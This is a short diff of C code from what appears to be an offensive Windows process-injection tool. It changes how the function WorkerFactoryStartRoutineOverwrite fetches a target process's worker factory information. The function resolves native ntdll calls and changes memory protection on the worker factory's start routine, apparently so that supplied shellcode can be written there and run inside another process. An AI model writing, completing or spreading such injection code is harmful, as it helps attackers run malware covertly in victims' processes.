@@ -4,7 +4,7 @@ void WorkerFactoryStartRoutineOverwrite(HANDLE hTarget, CHAR* shellcode, SIZE_T 
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
     _NtSetInformationWorkerFactory NtSetInformationWorkerFactory = (_NtSetInformationWorkerFactory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationWorkerFactory"));
 
-    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();
+    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hTpWorkerFactory);
 
     DWORD dwOldProtect = NULL;
     KERNEL32$VirtualProtectEx(hTarget, WorkerFactoryInformation.StartRoutine, shellcodeSize, PAGE_READWRITE, &dwOldProtect);
